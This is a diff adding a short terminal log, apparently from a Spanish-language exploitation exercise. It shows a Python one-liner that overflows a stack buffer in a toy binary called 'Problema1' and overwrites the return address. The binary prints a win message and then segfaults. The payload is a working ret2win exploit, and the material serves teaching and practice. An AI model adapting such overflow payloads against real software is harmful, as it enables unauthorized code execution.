@@ -1,0 +1,4 @@
+❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*0x20 + b'A'*8 + b'\x56\x11\x40\x00\x00\x00\x00\x00')" | ./Problema1
+Ganaste, toma 5 pesos
+[1]    259986 done                              python3 -c  | 
+       259987 segmentation fault (core dumped)  ./Problema1
